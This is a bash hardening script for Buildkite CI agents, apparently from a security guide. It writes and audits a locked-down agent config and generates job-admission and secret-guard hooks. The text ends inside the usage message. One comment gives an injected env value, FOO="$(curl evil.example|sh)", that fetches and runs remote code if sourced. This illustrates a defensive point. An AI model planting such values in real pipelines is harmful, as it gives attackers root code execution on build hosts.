#!/usr/bin/env bash
# =============================================================================
# HTH Buildkite Control 2.4: Control Untrusted Input to Pipelines
#   — agent-side enforcement (buildkite-agent.cfg + job/lifecycle hooks)
# Profile Level: L2 (Walk)
# Frameworks: CIS Controls 16.1 | NIST 800-53 SI-10, CM-7
# Source: https://howtoharden.com/guides/buildkite/#24-control-untrusted-input-to-pipelines
#
# This is the ONLY pack for control 2.4. Everything 2.4 asks for lives on the
# agent host: the guide's own Rationale says agent-side controls "are the only
# ones a malicious pipeline.yml cannot switch off", and nothing in Terraform,
# REST or GraphQL reaches any of it. One file, three artifacts:
#   1. a hardened buildkite-agent.cfg (emit or apply, plus a fail-closed audit)
#   2. a `pre-bootstrap` job-admission hook   (runs BEFORE checkout)
#   3. a `pre-command` hook that pins the pipeline-upload secret guard
#
# AGENT MAJOR VERSION: primary target is buildkite-agent **v3** (v3.137.0 read
# at authoring). Every config key below is byte-identical in `main` (4.0.0-beta),
# with ONE divergence that changes behaviour — the pipeline-upload secret guard,
# documented at T7. The generated pre-command hook is correct on both majors.
#
# AUTHORING STATUS: DRIFT-CHECKED-ONLY.
# `buildkite-agent` is not installed in the authoring environment, so nothing
# below was executed here. Nothing below is quoted from documentation either —
# every key, env var, default and interaction was read out of the agent source
# at tag v3.137.0 and cross-checked against `main`, 2026-08-18:
#   clicommand/agent_start.go     :185-195, 615-676, 954-982, 1118-1130, 1286-1298
#   clicommand/global.go          :151-168   (redacted-vars defaults)
#   clicommand/pipeline_upload.go :86-148, 611-621  (v3) / :86-142, 627-637 (main)
#   internal/redact/redact.go     :20-24, 108-160   (LengthMin, path.Match)
#   internal/job/executor.go      :861-925, 1030-1035, 1173-1183, 1317-1327
#   internal/job/hook/hook.go     :16-36     (hook file resolution)
#   agent/job_runner.go           :493-500, 555-600, 888-897, 909-951
# Env-var semantics ("this value cannot be modified", fork/PR vars) come from
# buildkite.com/docs/pipelines/configure/environment-variables, read the same day.
#
# -----------------------------------------------------------------------------
# ⚠️ T1 — `no-command-eval=true` SILENTLY KILLS YOUR PLUGIN ALLOWLIST
# -----------------------------------------------------------------------------
# agent_start.go, verbatim structure (v3.137.0:954-982, identical on main):
#
#   isSetNoPlugins := c.IsSet("no-plugins")
#   if configFile != nil {
#       if _, exists := configFile.Config["no-plugins"]; exists { isSetNoPlugins = true }
#   }
#   ...
#   // Turning off command eval or local hooks will also turn off plugins unless
#   // `--no-plugins=false` is provided specifically
#   if (cfg.NoCommandEval || cfg.NoLocalHooks) && !isSetNoPlugins {
#       cfg.NoPlugins = true
#   }
#
# Setting EITHER `no-command-eval=true` OR `no-local-hooks=true` forces
# no-plugins ON unless the `no-plugins` key is physically present in the config
# file (or passed on the command line). So the obvious hardened config —
#
#   no-command-eval=true
#   allowed-plugins=^github\.com/acme/.*$
#
# — disables plugins entirely and `allowed-plugins` is dead configuration. The
# agent logs nothing about it, because from its point of view you asked for no
# plugins. To get an allowlist you must write `no-plugins=false` explicitly,
# which is exactly what the `allowlist` posture below does. audit() fails on
# this combination; it is the single most likely way to believe 2.4 is
# implemented when it is not.
#
# The corollary is a real trade, not a formality. The agent's own warning on the
# explicit-enable path reads: "Plugins have been specifically enabled, despite
# no-command-eval being enabled. Plugins can execute arbitrary hooks and
# commands". Plugin hooks are scripts on disk and run as hooks — `no-command-eval`
# only blocks the pipeline's own `command` (executor.go:1317-1327). An allowlisted
# plugin is trusted code. Choose posture `none` when nothing on the agent needs
# plugins; choose `allowlist` when something does and pin it hard (T4).
#
# -----------------------------------------------------------------------------
# ⚠️ T2 — `redacted-vars` IS GLOBS; `allowed-*` IS REGEXES. MIXING THEM UP FAILS
#          IN OPPOSITE DIRECTIONS.
# -----------------------------------------------------------------------------
# redact.MatchAny uses path.Match (redact.go:108-131) — shell-glob semantics,
# full-name match, case-sensitive. A regex in redacted-vars is not an error; it
# just never matches anything, and no secret is ever redacted. FAILS SILENT.
# allowed-plugins / allowed-repositories / allowed-environment-variables are fed
# to regexp.Compile (agent_start.go:1286-1298); a glob like `*_TOKEN` is an
# invalid regex, the agent calls l.Fatalf and REFUSES TO START. FAILS LOUD.
# validate_globs()/validate_regexes() below reject each kind before you ship it.
#
# -----------------------------------------------------------------------------
# ⚠️ T3 — `redacted-vars` MUST BE APPENDED, NEVER REPLACED, AND HAS A 6-BYTE FLOOR
# -----------------------------------------------------------------------------
# The flag carries NINE built-in defaults (global.go:151-168), not the seven
# some vendor pages list. Writing your own list REPLACES all of them, and the
# two that documentation tends to omit — *_SSH_KEY and *_API_KEY — are the two
# most valuable to keep. merge_redacted_vars() unions your additions onto the
# full built-in nine and audit() fails if any of the nine went missing.
# Second half of the same trap: redact.LengthMin = 6 (redact.go:20-24). A value
# shorter than six bytes is skipped even when its NAME matches. Short tokens,
# 4-digit PINs and the string "none" are never redacted. Redaction is
# defence-in-depth for control 3.5, not a reason to let a secret reach a log.
#
# -----------------------------------------------------------------------------
# ⚠️ T4 — THE ALLOWLIST REGEXES ARE NOT ANCHORED FOR YOU
# -----------------------------------------------------------------------------
# The agent compiles them with regexp.Compile, which yields an unanchored
# pattern; every example in the agent's own flag usage strings starts with `^`
# ("^git@github.com:buildkite/.*", "^buildkite-plugins/.*$", "^MYAPP_.*$").
# An unanchored `github\.com/acme/` matches `https://evil.example/github.com/acme/`.
# This pack refuses any policy pattern that does not begin with `^`.
#
# -----------------------------------------------------------------------------
# ⚠️ T5 — A pre-bootstrap HOOK THAT READS $BUILDKITE_* FAILS OPEN
# -----------------------------------------------------------------------------
# job_runner.go:909-951 builds the pre-bootstrap hook's environment explicitly.
# It contains ONLY: BUILDKITE_ENV_FILE, BUILDKITE_ENV_JSON_FILE, BUILDKITE_JOB_ID,
# BUILDKITE_AGENT_ACCESS_TOKEN, BUILDKITE_AGENT_ENDPOINT, BUILDKITE_NO_HTTP2,
# BUILDKITE_AGENT_DEBUG, BUILDKITE_AGENT_DEBUG_HTTP — plus whatever the agent
# process itself inherited. The JOB's variables are NOT in it. So the natural
# hook body:
#
#   if [ "$BUILDKITE_REPO" != "git@github.com:acme/app.git" ]; then exit 1; fi
#
# compares an EMPTY string, takes the accept path on every job, and admits
# everything while looking like a control. The job env is only available by
# reading the file that BUILDKITE_ENV_JSON_FILE points at.
#
# And it must be READ, never SOURCED. The agent writes the shell-format file
# with `fmt.Fprintf(r.envShellFile, "%s=%q\n", key, value)` (job_runner.go:573)
# — Go %q quoting, NOT shell escaping — and its own comment says the hook
# "should do this validation *without* sourcing the file", because a job env var
# is attacker-supplied (anyone who can open a build can set one in the New Build
# dialog). `source`-ing `FOO="$(curl evil.example|sh)"` executes it as root
# before checkout. The generated hook parses the JSON sibling with jq and never
# sources anything.
#
# -----------------------------------------------------------------------------
# ⚠️ T6 — HOOK PHASE ORDER DECIDES WHO WINS, AND THE REPO GETS A TURN
# -----------------------------------------------------------------------------
# Within every phase the executor runs global -> local -> plugin
# (executor.go:1177-1183). "Local" means `.buildkite/hooks/<name>` INSIDE THE
# CHECKOUT (executor.go:880-884) — attacker-authored on any untrusted branch or
# fork. So anything a global hook exports can be re-exported by the repository's
# own hook moments later, in the same phase.
# Two consequences this pack acts on:
#   * The secret guard belongs in `pre-command`, not `environment`. The
#     `environment` hook fires in setUp before checkout and before plugins
#     (executor.go:1030-1035); `pre-command` is the LAST global hook before the
#     command runs, so it wins against everything that ran earlier — including
#     plugin environment hooks. It cannot win against a repo-supplied local
#     hook, which is the next line of the same phase.
#   * Therefore `no-local-hooks=true` in the config is not optional garnish.
#     It is what makes the pre-command guarantee hold at all (executor.go:910-920
#     "refusing to run %s, local hooks are disabled"). The generated hook also
#     exports BUILDKITE_NO_LOCAL_HOOKS=true as a runtime ratchet — the executor
#     honours that env var and it can only ever disable, never re-enable — but a
#     ratchet applied at pre-command is already too late for the local
#     post-checkout hook. Config is the control; the export is a belt.
#
# -----------------------------------------------------------------------------
# ⚠️ T7 — reject-secrets IS NOT A CONFIG KEY, AND v4 INVERTS IT
# -----------------------------------------------------------------------------
# It is a flag on `buildkite-agent pipeline upload`, never on `agent start`, so
# it can never appear in buildkite-agent.cfg. Putting it there does nothing.
#   v3: --reject-secrets / BUILDKITE_AGENT_PIPELINE_UPLOAD_REJECT_SECRETS,
#       default FALSE. v3.137.0 pipeline_upload.go:620-621 warns and uploads
#       anyway, and says outright "The behaviour in the above flags will become
#       default in Buildkite Agent v4".
#   v4: --reject-secrets is GONE. The field is AllowSecrets, the flag is
#       --allow-secrets / BUILDKITE_AGENT_PIPELINE_UPLOAD_ALLOW_SECRETS, default
#       FALSE, and the check is `if !cfg.AllowSecrets { return error }`. Reject
#       is the default; the flag now UNDOES the control.
# A v3-era `BUILDKITE_AGENT_PIPELINE_UPLOAD_REJECT_SECRETS=true` baked into a
# v4 image is not read by anything — it is inert, not inherited. The generated
# hook sets the v3 variable AND clears the v4 one on every job, which is correct
# on both majors because each ignores the other's variable.
# Setting it as a plain agent-host environment variable is NOT equivalent: that
# name is not one the agent protects (job_runner.go:493-500 only records
# agent-set names in BUILDKITE_IGNORED_ENV), so a pipeline `env:` block can
# override it to false. A pre-command hook export cannot be overridden that way.
#
# -----------------------------------------------------------------------------
# ⚠️ T8 — allowed-environment-variables WITHOUT ITS SWITCH IS A CRASH, NOT A NO-OP
# -----------------------------------------------------------------------------
# agent_start.go:1118: `if len(cfg.AllowedEnvironmentVariables) > 0 &&
# !cfg.EnableEnvironmentVariableAllowList { l.Fatalf(...) }`. The agent exits at
# startup. Under a supervisor that is a restart loop and an outage. The reverse
# is safe and useful: `enable-environment-variable-allowlist=true` alone permits
# only Buildkite-set variables, which is the tightest posture available.
#
# Requires: jq (on the agent host, at job time too), and root write access to
# the agent config and hooks directory. Run ON THE AGENT HOST.
# =============================================================================

set -euo pipefail

# Policy inputs are deliberately given no defaults. An empty allowed-repositories
# is not "no policy configured", it is "every repository on the internet is
# permitted" — the exact silent-failure this control exists to remove.
case "${1:-audit}" in
  emit|apply|install-hooks)
    : "${HTH_ALLOWED_REPOSITORIES:?set HTH_ALLOWED_REPOSITORIES (comma-separated ANCHORED regexes, e.g. '^git@github.com:acme/.*,^https://github.com/acme/.*')}"
    : "${HTH_ALLOWED_PLUGINS:?set HTH_ALLOWED_PLUGINS (comma-separated ANCHORED regexes, or NONE to forbid plugins entirely)}"
    ;;
esac

AGENT_CFG="${BUILDKITE_AGENT_CONFIG:-/etc/buildkite-agent/buildkite-agent.cfg}"
HOOKS_PATH="${BUILDKITE_HOOKS_PATH:-/etc/buildkite-agent/hooks}"
# Extra glob patterns appended to the built-in nine. Globs, never regexes (T2).
HTH_EXTRA_REDACTED_VARS="${HTH_EXTRA_REDACTED_VARS:-}"
# Anchored regexes for job-supplied env vars. Empty = only Buildkite-set vars.
HTH_ALLOWED_ENVIRONMENT_VARIABLES="${HTH_ALLOWED_ENVIRONMENT_VARIABLES:-}"
# Fork builds are rejected at admission unless this is exactly "true", in which
# case the fork's repo URL must still satisfy HTH_ALLOWED_REPOSITORIES.
HTH_ALLOW_FORK_BUILDS="${HTH_ALLOW_FORK_BUILDS:-false}"
# When "true" the admission hook demands a 40-hex commit pin on every plugin.
HTH_REQUIRE_PLUGIN_SHA="${HTH_REQUIRE_PLUGIN_SHA:-false}"

# The nine built-in redacted-vars patterns, verbatim from clicommand/global.go.
# Order preserved so a diff against the source stays readable.
AGENT_DEFAULT_REDACTED_VARS='*_PASSWORD,*_SECRET,*_TOKEN,*_PRIVATE_KEY,*_SSH_KEY,*_ACCESS_KEY,*_SECRET_KEY,*_CONNECTION_STRING,*_API_KEY'

# HTH Guide Excerpt: begin config-untrusted-input-agent-cfg
# Emit or apply the hardened buildkite-agent.cfg for an agent pool that runs
# untrusted input, then prove the result actually enforces something.

die() { echo "FATAL: $*" >&2; exit 1; }

# T4: the agent does not anchor these for you. Refuse to ship a pattern that
# would match a substring of a hostile URL or plugin source.
validate_regexes() {
  local label="$1" list="$2" pat
  local IFS=','
  for pat in ${list}; do
    [ -n "${pat}" ] || continue
    case "${pat}" in
      '^'*) ;;
      *) die "${label}: pattern '${pat}' is not anchored. regexp.Compile leaves it unanchored, so it matches anywhere in the value. Prefix it with '^'." ;;
    esac
    # grep -E exits 1 on "no match" (fine) and 2 on a malformed pattern. The
    # agent calls l.Fatalf on a pattern regexp.Compile rejects, so catching it
    # here is the difference between a config error and an agent restart loop.
    if printf '%s' "" | grep -Eq "${pat}" 2>/dev/null; then
      :
    else
      local grc=$?
      [ "${grc}" -le 1 ] || die "${label}: '${pat}' is not a valid regular expression."
    fi
  done
}

# T2: redacted-vars goes through path.Match, so regex metacharacters are matched
# literally and quietly protect nothing.
validate_globs() {
  local label="$1" list="$2" pat
  local IFS=','
  for pat in ${list}; do
    [ -n "${pat}" ] || continue
    case "${pat}" in
      *'^'*|*'$'*|*'.*'*|*'\'*)
        die "${label}: '${pat}' looks like a regex. This field is matched with path.Match (globs); a regex here matches nothing and redacts nothing. Use '*_SUFFIX' form." ;;
    esac
  done
}

read_cfg() {
  local key="$1" raw
  [ -r "${AGENT_CFG}" ] || return 1
  raw="$(sed -nE "s|^[[:space:]]*${key}[[:space:]]*=[[:space:]]*(.*)$|\1|p" "${AGENT_CFG}" | tail -1)"
  # Values may be written bare or quoted; normalise both.
  raw="${raw%\"}"; raw="${raw#\"}"
  printf '%s' "${raw}"
}

# Delete-then-append rather than sed-substitute: these values are regexes and
# routinely contain the alternation pipe, which would terminate any sed
# replacement delimiter you pick. Only the key is ever interpolated into a
# pattern here; the value is only ever written by printf.
set_cfg() {
  local key="$1" value="$2" tmp
  tmp="$(mktemp)"
  grep -vE "^[[:space:]]*${key}[[:space:]]*=" "${AGENT_CFG}" >"${tmp}" || true
  printf '%s=%s\n' "${key}" "${value}" >>"${tmp}"
  cat "${tmp}" >"${AGENT_CFG}"
  rm -f "${tmp}"
}

# T3: union, never replace. Starts from whatever is already on disk if that is
# itself a superset of the built-ins, otherwise from the built-in nine.
merge_redacted_vars() {
  local current extra merged pat seen
  current="$(read_cfg redacted-vars || true)"
  [ -n "${current}" ] || current="${AGENT_DEFAULT_REDACTED_VARS}"
  merged="${AGENT_DEFAULT_REDACTED_VARS}"
  extra="${current},${HTH_EXTRA_REDACTED_VARS}"
  local IFS=','
  for pat in ${extra}; do
    [ -n "${pat}" ] || continue
    seen=0
    case ",${merged}," in *",${pat},"*) seen=1 ;; esac
    [ "${seen}" -eq 1 ] || merged="${merged},${pat}"
  done
  printf '%s' "${merged}"
}

# The config body. Two plugin postures, because T1 makes "allowlist" a different
# file from "none" rather than one extra line.
render_cfg() {
  local redacted plugin_lines env_lines
  redacted="$(merge_redacted_vars)"

  if [ "${HTH_ALLOWED_PLUGINS}" = "NONE" ]; then
    # Written explicitly even though no-command-eval would force it: an implicit
    # value cannot be audited, and a later reviewer must not have to know T1.
    plugin_lines="no-plugins=true"
  else
    validate_regexes "allowed-plugins" "${HTH_ALLOWED_PLUGINS}"
    plugin_lines="no-plugins=false
allowed-plugins=${HTH_ALLOWED_PLUGINS}"
  fi

  if [ -n "${HTH_ALLOWED_ENVIRONMENT_VARIABLES}" ]; then
    validate_regexes "allowed-environment-variables" "${HTH_ALLOWED_ENVIRONMENT_VARIABLES}"
    env_lines="enable-environment-variable-allowlist=true
allowed-environment-variables=${HTH_ALLOWED_ENVIRONMENT_VARIABLES}"
  else
    # T8: the switch alone is valid and is the tightest posture. The list alone
    # is a startup Fatalf, which is why it is never emitted without the switch.
    env_lines="enable-environment-variable-allowlist=true"
  fi

  validate_regexes "allowed-repositories" "${HTH_ALLOWED_REPOSITORIES}"
  validate_globs "redacted-vars" "${redacted}"

  cat <<CFGEOF
# --- HTH control 2.4: untrusted input ----------------------------------------
# Only the reviewed definition executes: the pipeline's own command string is
# refused and checkout-override-mode is forced to 'strict'.
no-command-eval=true
# Repository hooks are attacker-authored on an untrusted branch. See T6.
no-local-hooks=true
${plugin_lines}
# Anchored. The agent does not anchor these for you (T4).
allowed-repositories=${HTH_ALLOWED_REPOSITORIES}
${env_lines}
# Built-in nine plus local additions; globs, not regexes; 6-byte floor (T2, T3).
redacted-vars=${redacted}
# --- end HTH control 2.4 -----------------------------------------------------
CFGEOF
}

# Print the block for baking into an image or a config-management template.
emit_cfg() { render_cfg; }

# Idempotent in-place application against an existing config file.
apply_cfg() {
  [ -w "${AGENT_CFG}" ] || die "cannot write ${AGENT_CFG} (run as root)."
  local line key value
  while IFS= read -r line; do
    case "${line}" in ''|'#'*) continue ;; esac
    key="${line%%=*}"; value="${line#*=}"
    set_cfg "${key}" "${value}"
  done <<<"$(render_cfg)"
  # A key we deliberately never write: reject-secrets. It is a pipeline-upload
  # flag and has no meaning in this file (T7). If a previous attempt put it
  # here, remove it rather than leaving a line that implies a control.
  if grep -qE '^[[:space:]]*reject-secrets[[:space:]]*=' "${AGENT_CFG}"; then
    local tmp; tmp="$(mktemp)"
    grep -vE '^[[:space:]]*reject-secrets[[:space:]]*=' "${AGENT_CFG}" >"${tmp}"
    cat "${tmp}" >"${AGENT_CFG}"; rm -f "${tmp}"
    echo "removed inert 'reject-secrets' key from ${AGENT_CFG} (see T7)."
  fi
  echo "Applied. Restart buildkite-agent, then run: $0 audit"
}

# Fail closed on every combination that looks configured but enforces nothing.
audit_cfg() {
  local rc=0 eval_off hooks_off noplugins allowplugins repos envswitch envlist redacted pat
  [ -r "${AGENT_CFG}" ] || die "cannot read ${AGENT_CFG}"

  eval_off="$(read_cfg no-command-eval || true)"
  hooks_off="$(read_cfg no-local-hooks || true)"
  noplugins="$(read_cfg no-plugins || true)"
  allowplugins="$(read_cfg allowed-plugins || true)"
  repos="$(read_cfg allowed-repositories || true)"
  envswitch="$(read_cfg enable-environment-variable-allowlist || true)"
  envlist="$(read_cfg allowed-environment-variables || true)"
  redacted="$(read_cfg redacted-vars || true)"

  echo "config file                           : ${AGENT_CFG}"
  echo "no-command-eval                       : ${eval_off:-<unset> (default false)}"
  echo "no-local-hooks                        : ${hooks_off:-<unset> (default false)}"
  echo "no-plugins                            : ${noplugins:-<unset>}"
  echo "allowed-plugins                       : ${allowplugins:-<unset>}"
  echo "allowed-repositories                  : ${repos:-<unset>}"
  echo "enable-environment-variable-allowlist : ${envswitch:-<unset> (default false)}"
  echo "redacted-vars                         : ${redacted:-<unset> (built-in nine)}"

  [ "${eval_off}" = "true" ] || { echo "FAIL: no-command-eval is not true. A pipeline.yml can run arbitrary commands here." >&2; rc=1; }
  [ "${hooks_off}" = "true" ] || { echo "FAIL: no-local-hooks is not true. .buildkite/hooks/* from the checkout executes, and can undo every hook-based control (T6)." >&2; rc=1; }

  # T1, the headline check.
  if [ -n "${allowplugins}" ] && [ -z "${noplugins}" ] \
     && { [ "${eval_off}" = "true" ] || [ "${hooks_off}" = "true" ]; }; then
    echo "FAIL: allowed-plugins is set but the 'no-plugins' key is ABSENT while no-command-eval/no-local-hooks is on." >&2
    echo "      agent_start.go forces no-plugins=true in exactly this case: plugins are OFF and your allowlist is dead configuration." >&2
    echo "      Write 'no-plugins=false' explicitly to enable the allowlist, or drop allowed-plugins and write 'no-plugins=true'." >&2
    rc=1
  fi
  if [ "${noplugins}" = "false" ] && [ -z "${allowplugins}" ]; then
    echo "FAIL: no-plugins=false with no allowed-plugins — every third-party plugin on the internet may execute here." >&2
    rc=1
  fi

  if [ -z "${repos}" ]; then
    echo "FAIL: allowed-repositories unset. The agent will clone any repository a job names." >&2
    rc=1
  else
    local IFS=','
    for pat in ${repos} ${allowplugins} ${envlist}; do
      [ -n "${pat}" ] || continue
      case "${pat}" in '^'*) ;; *) echo "FAIL: allowlist pattern '${pat}' is unanchored (T4)." >&2; rc=1 ;; esac
    done
    unset IFS
  fi

  # T8: this ordering is a startup crash, so catch it before the restart.
  if [ -n "${envlist}" ] && [ "${envswitch}" != "true" ]; then
    echo "FAIL: allowed-environment-variables is set without enable-environment-variable-allowlist." >&2
    echo "      The agent calls l.Fatalf on this and will not start." >&2
    rc=1
  fi

  # T3: prove nothing was dropped from the built-in nine.
  if [ -n "${redacted}" ]; then
    local IFS=','
    for pat in ${AGENT_DEFAULT_REDACTED_VARS}; do
      case ",${redacted}," in
        *",${pat},"*) ;;
        *) echo "FAIL: redacted-vars overrides the built-in list and DROPPED '${pat}'." >&2; rc=1 ;;
      esac
    done
    unset IFS
    validate_globs "redacted-vars" "${redacted}"
  fi

  # T7: this key can only ever be cargo cult here.
  if grep -qE '^[[:space:]]*reject-secrets[[:space:]]*=' "${AGENT_CFG}"; then
    echo "FAIL: 'reject-secrets' in buildkite-agent.cfg is inert — it is a 'pipeline upload' flag, not an 'agent start' one (T7)." >&2
    rc=1
  fi

  for h in pre-bootstrap pre-command; do
    if [ ! -x "${HOOKS_PATH}/${h}" ]; then
      echo "FAIL: ${HOOKS_PATH}/${h} missing or not executable. Run: $0 install-hooks" >&2
      rc=1
    fi
  done

  [ "${rc}" -eq 0 ] && echo "PASS: agent enforces control 2.4."
  return "${rc}"
}
# HTH Guide Excerpt: end config-untrusted-input-agent-cfg

# HTH Guide Excerpt: begin config-untrusted-input-pre-bootstrap
# Job admission BEFORE checkout. exit 0 permits the job; ANY non-zero rejects it
# and no untrusted code has touched the disk yet (job_runner.go:940-950).
# This is the only place in Buildkite where a job can be refused on its own
# inputs, and the only place where BUILDKITE_REPO is still the server-supplied
# value — the docs mark it modifiable by environment/pre-checkout hooks, both of
# which run later.

# printf %q gives us shell-safe embedding of policy values into the generated
# hook without a second config file to protect.
shq() { printf '%q' "$1"; }

write_pre_bootstrap() {
  local dest="${HOOKS_PATH}/pre-bootstrap" tmp
  [ -d "${HOOKS_PATH}" ] || die "hooks path ${HOOKS_PATH} does not exist."
  tmp="${dest}.hth.tmp"
  {
    printf '#!/usr/bin/env bash\n'
    printf '# Generated by HTH buildkite 2.4 pack. Edit the pack, not this file.\n'
    printf 'HTH_ALLOWED_REPOSITORIES=%s\n' "$(shq "${HTH_ALLOWED_REPOSITORIES}")"
    printf 'HTH_ALLOWED_PLUGINS=%s\n'      "$(shq "${HTH_ALLOWED_PLUGINS}")"
    printf 'HTH_ALLOW_FORK_BUILDS=%s\n'    "$(shq "${HTH_ALLOW_FORK_BUILDS}")"
    printf 'HTH_REQUIRE_PLUGIN_SHA=%s\n'   "$(shq "${HTH_REQUIRE_PLUGIN_SHA}")"
    cat <<'PREBOOTSTRAP'

# No `set -e`: every exit path here is deliberate, and an unexpected non-zero
# from a helper must not be mistaken for a considered rejection.
set -uo pipefail

reject() { echo "pre-bootstrap: REJECTED job ${BUILDKITE_JOB_ID:-?}: $*" >&2; exit 1; }
permit() { echo "pre-bootstrap: admitted job ${BUILDKITE_JOB_ID:-?}: $*"; exit 0; }

# Fail closed on a broken agent host. A missing jq must not mean "allow".
command -v jq >/dev/null 2>&1 || reject "jq is not installed on this agent host"

# T5: the job's variables are NOT in this hook's environment. They are in a file.
[ -n "${BUILDKITE_ENV_JSON_FILE:-}" ] || reject "BUILDKITE_ENV_JSON_FILE is unset"
[ -r "${BUILDKITE_ENV_JSON_FILE}" ]   || reject "cannot read ${BUILDKITE_ENV_JSON_FILE}"

# READ, never source. The sibling shell-format file is Go %q-quoted, not shell
# escaped, and its values are attacker-supplied (job_runner.go:565-573).
jget() { jq -r --arg k "$1" '.[$k] // ""' "${BUILDKITE_ENV_JSON_FILE}"; }

repo="$(jget BUILDKITE_REPO)"
pr_repo="$(jget BUILDKITE_PULL_REQUEST_REPO)"
pr_num="$(jget BUILDKITE_PULL_REQUEST)"
plugins_json="$(jget BUILDKITE_PLUGINS)"
pipeline="$(jget BUILDKITE_PIPELINE_SLUG)"

# grep -E is POSIX ERE while the agent uses Go RE2. Keep policy patterns in the
# common subset (anchors, character classes, ., *, +, ?, alternation) so the
# admission decision here and the agent's own allowlist cannot disagree.
matches_any() {
  local value="$1" list="$2" pat
  local IFS=','
  for pat in ${list}; do
    [ -n "${pat}" ] || continue
    if printf '%s' "${value}" | grep -Eq "${pat}"; then return 0; fi
  done
  return 1
}

[ -n "${repo}" ] || reject "BUILDKITE_REPO is empty; cannot evaluate repository policy"
matches_any "${repo}" "${HTH_ALLOWED_REPOSITORIES}" \
  || reject "repository ${repo} is not in the allowlist"

# Fork detection. BUILDKITE_PULL_REQUEST_REPO is "" when the build is not a pull
# request, and holds the SOURCE repository's URL when it is. A value that differs
# from BUILDKITE_REPO means the code is coming from a repository you do not own.
if [ -n "${pr_repo}" ] && [ "${pr_repo}" != "${repo}" ]; then
  [ "${HTH_ALLOW_FORK_BUILDS}" = "true" ] \
    || reject "fork build (PR #${pr_num} from ${pr_repo}) — forks run contributor code on this agent's credentials"
  matches_any "${pr_repo}" "${HTH_ALLOWED_REPOSITORIES}" \
    || reject "fork ${pr_repo} is not in the allowlist"
fi

# Plugins. BUILDKITE_PLUGINS is a JSON array of single-key objects whose key is
# the plugin reference ("source#ref"); the agent parses it the same way
# (job_runner.go:888-897, []map[string]json.RawMessage).
if [ -n "${plugins_json}" ] && [ "${plugins_json}" != "null" ]; then
  if [ "${HTH_ALLOWED_PLUGINS}" = "NONE" ]; then
    reject "plugins are forbidden on this agent but the step declares some"
  fi
  plugin_refs="$(printf '%s' "${plugins_json}" | jq -r '
      def refs: if type == "string" then . elif type == "object" then keys_unsorted[] else empty end;
      if type == "array" then (.[] | refs) elif type == "object" then keys_unsorted[] else empty end
    ' 2>/dev/null)" || reject "BUILDKITE_PLUGINS is not parseable JSON"
  [ -n "${plugin_refs}" ] || reject "BUILDKITE_PLUGINS is set but no plugin reference could be extracted"

  while IFS= read -r ref; do
    [ -n "${ref}" ] || continue
    matches_any "${ref}" "${HTH_ALLOWED_PLUGINS}" \
      || reject "plugin ${ref} is not in the allowlist"

    # Guide step 2.2: pin every plugin reference. A floating ref is an
    # unreviewed dependency that the plugin author can change under you.
    case "${ref}" in
      *'#'*) pin="${ref##*#}" ;;
      *)     pin="" ;;
    esac
    [ -n "${pin}" ] || reject "plugin ${ref} is unpinned (no #version or #commit)"
    case "${pin}" in
      main|master|HEAD|latest|stable)
        reject "plugin ${ref} is pinned to the moving ref '${pin}'" ;;
    esac
    if [ "${HTH_REQUIRE_PLUGIN_SHA}" = "true" ]; then
      printf '%s' "${pin}" | grep -Eq '^[0-9a-f]{40}$' \
        || reject "plugin ${ref} is not pinned to a 40-hex commit (tags are mutable)"
    fi
  done <<EOF
${plugin_refs}
EOF
fi

permit "pipeline=${pipeline} repo=${repo}"
PREBOOTSTRAP
  } >"${tmp}"
  chmod 0755 "${tmp}"
  mv "${tmp}" "${dest}"
  echo "wrote ${dest}"
}
# HTH Guide Excerpt: end config-untrusted-input-pre-bootstrap

# HTH Guide Excerpt: begin config-untrusted-input-pre-command
# Pin the pipeline-upload secret guard at the last global hook before the
# command runs (T6), correctly on both agent majors (T7).

write_pre_command() {
  local dest="${HOOKS_PATH}/pre-command" tmp
  [ -d "${HOOKS_PATH}" ] || die "hooks path ${HOOKS_PATH} does not exist."
  tmp="${dest}.hth.tmp"
  cat >"${tmp}" <<'PRECOMMAND'
#!/usr/bin/env bash
# Generated by HTH buildkite 2.4 pack. Edit the pack, not this file.
set -uo pipefail

# T7: v3 reads REJECT_SECRETS (default off, must be turned ON).
#     v4 removed it and reads ALLOW_SECRETS (default off, must stay UNSET).
# Each major ignores the other's variable, so doing both is correct everywhere
# and needs no version detection to be safe.
export BUILDKITE_AGENT_PIPELINE_UPLOAD_REJECT_SECRETS=true
unset BUILDKITE_AGENT_PIPELINE_UPLOAD_ALLOW_SECRETS

# T6: runtime ratchet. The executor re-reads this before each local hook and
# only ever uses it to DISABLE, so a pipeline cannot flip it back. This is a
# belt: local post-checkout hooks already ran, which is why no-local-hooks=true
# in buildkite-agent.cfg remains the actual control.
export BUILDKITE_NO_LOCAL_HOOKS=true

# Informational only — the exports above are already correct on both majors.
if command -v buildkite-agent >/dev/null 2>&1; then
  agent_version="$(buildkite-agent --version 2>/dev/null | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+[^ ,]*' | head -1)"
  case "${agent_version%%.*}" in
    3) echo "pre-command: agent v${agent_version}: pipeline uploads containing interpolated secrets will be rejected (--reject-secrets)." ;;
    4|5|6|7|8|9) echo "pre-command: agent v${agent_version}: secret rejection is the default; --allow-secrets is cleared." ;;
    *) echo "pre-command: could not determine agent major version; both secret-guard variables set defensively." >&2 ;;
  esac
fi
PRECOMMAND
  chmod 0755 "${tmp}"
  mv "${tmp}" "${dest}"
  echo "wrote ${dest}"
}

install_hooks() {
  write_pre_bootstrap
  write_pre_command
  echo "Hooks installed under ${HOOKS_PATH}. Restart buildkite-agent so the"
  echo "pre-bootstrap hook is picked up, then run: $0 audit"
}
# HTH Guide Excerpt: end config-untrusted-input-pre-command

case "${1:-audit}" in
  emit)          emit_cfg ;;
  apply)         apply_cfg ;;
  install-hooks) install_hooks ;;
  audit)         audit_cfg ;;
  *)
    cat >&2 <<'USAGE'
usage:
  hth-buildkite-2.04-agent-untrusted-input.sh emit           print the hardened buildkite-agent.cfg block
  hth-buildkite-2.04-agent-untrusted-input.sh apply          apply it in place (idempotent, root)
  hth-buildkite-2.04-agent-untrusted-input.sh install-hooks  write pre-bootstrap + pre-command hooks
  hth-buildkite-2.04-agent-untrusted-input.sh audit          prove enforcement is real (exit 1 on fail)

Required for emit/apply/install-hooks:
  HTH_ALLOWED_REPOSITORIES  comma-separated ANCHORED regexes, e.g.
                            '^git@github.com:acme/.*,^https://github.com/acme/.*'
  HTH_ALLOWED_PLUGINS       comma-separated ANCHORED regexes, or the literal
                            NONE to forbid plugins entirely

Optional:
  HTH_EXTRA_REDACTED_VARS            extra GLOBS appended to the built-in nine
  HTH_ALLOWED_ENVIRONMENT_VARIABLES  anchored regexes for job-supplied env vars
